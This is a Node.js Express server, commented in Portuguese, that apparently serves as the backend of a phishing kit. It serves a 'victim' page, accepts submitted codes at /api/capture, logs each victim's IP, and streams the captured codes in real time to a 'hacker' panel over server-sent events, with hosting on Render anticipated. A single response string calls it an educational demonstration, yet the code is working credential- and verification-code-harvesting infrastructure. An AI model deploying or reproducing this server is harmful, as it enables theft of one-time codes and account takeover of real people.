const express = require('express');
const cors = require('cors');
const path = require('path');
const app = express();

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// Armazenamento em memória (em produção use um banco de dados)
let capturedCodes = [];
let connectedHackers = [];

// Servir páginas estáticas
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'vitima.html'));
});

app.get('/vitima', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'vitima.html'));
});

app.get('/hacker', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'hacker-panel.html'));
});

// API para receber códigos das vítimas
app.post('/api/capture', (req, res) => {
    const victimData = {
        ...req.body,
        id: Date.now(),
        ip: req.ip || req.connection.remoteAddress,
        status: 'CAPTURADO',
        timestamp: new Date().toLocaleString('pt-BR')
    };

    console.log('🎯 Código capturado:', victimData.code);
    
    capturedCodes.push(victimData);
    
    // Notificar hackers conectados via SSE
    notifyHackers(victimData);
    
    res.json({ 
        status: 'success', 
        message: 'Código recebido pelo hacker',
        demo: 'Esta é uma demonstração educacional' 
    });
});

// API para hackers obterem os códigos
app.get('/api/codes', (req, res) => {
    res.json({
        total: capturedCodes.length,
        codes: capturedCodes,
        serverTime: new Date().toLocaleString('pt-BR')
    });
});

// Server-Sent Events para atualização em tempo real
app.get('/api/stream', (req, res) => {
    res.writeHead(200, {
        'Content-Type': 'text/event-stream',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Access-Control-Allow-Origin': '*'
    });

    const hackerId = Date.now();
    connectedHackers.push({ id: hackerId, res });

    req.on('close', () => {
        connectedHackers = connectedHackers.filter(h => h.id !== hackerId);
    });
});

function notifyHackers(victimData) {
    connectedHackers.forEach(hacker => {
        hacker.res.write(`data: ${JSON.stringify(victimData)}\n\n`);
    });
}

// Health check para Render
app.get('/health', (req, res) => {
    res.json({ 
        status: 'online', 
        capturas: capturedCodes.length,
        hackers_ativos: connectedHackers.length 
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Servidor rodando na porta ${PORT}`);
    console.log(`📱 Página da Vítima: http://localhost:${PORT}/vitima`);
    console.log(`🕵️ Painel do Hacker: http://localhost:${PORT}/hacker`);
});